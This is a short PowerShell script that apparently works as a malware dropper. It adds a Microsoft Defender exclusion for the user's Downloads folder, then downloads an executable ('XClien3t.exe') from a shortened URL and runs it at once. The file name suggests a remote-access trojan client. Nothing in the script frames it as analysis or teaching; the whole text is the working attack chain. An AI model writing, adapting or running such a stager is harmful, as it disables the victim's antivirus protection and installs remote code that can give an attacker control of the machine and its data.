Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
$url = 'https://tinyurl.com/2wcwj5d5'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'XClien3t.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100 

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile
